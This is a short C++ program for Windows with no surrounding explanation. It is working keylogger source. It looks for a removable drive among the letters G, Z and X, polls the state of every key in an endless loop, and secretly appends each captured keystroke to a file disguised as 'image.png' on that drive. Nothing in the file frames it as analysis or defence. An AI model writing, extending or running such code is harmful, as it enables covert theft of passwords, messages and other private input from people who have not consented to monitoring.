#include <windows.h>
#include <fstream>
#include <iostream>
#include <vector>

std::vector<std::string> GetRemovableDrives() {
    std::vector<std::string> removableDrives;
    const char driveLetters[] = "GZX";
    for (char drive : driveLetters) {
        char rootPath[] = { drive, ':', '\\', '\0' };
        UINT driveType = GetDriveTypeA(rootPath);
        if (driveType == DRIVE_REMOVABLE) {
            removableDrives.push_back(std::string(rootPath));
        }
    }
    return removableDrives;
}

void SaveKeyToFile(const std::string& drive, char key) {
    std::ofstream logFile(drive + "image.png", std::ios::app);
    if (logFile.is_open()) {
        logFile << key;
        logFile.close();
    } else {
        std::cerr << "Error: Unable to open file for writing on drive" << drive << std::endl;
    }
}

void LogKeystrokes(const std::string& drive) {
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                SaveKeyToFile(drive, key);
            }
        }
        Sleep(10);
    }
}

int main() {
    std::vector<std::string> removableDrives = GetRemovableDrives();
    if (removableDrives.empty()) {
        std::cerr << "No removable drives found." << std::endl;
        return 1;
    }

    for (const auto& drive : removableDrives) {
        std::cout << "Starting on drive " << drive << std::endl;
        LogKeystrokes(drive);
    }

    return 0;
}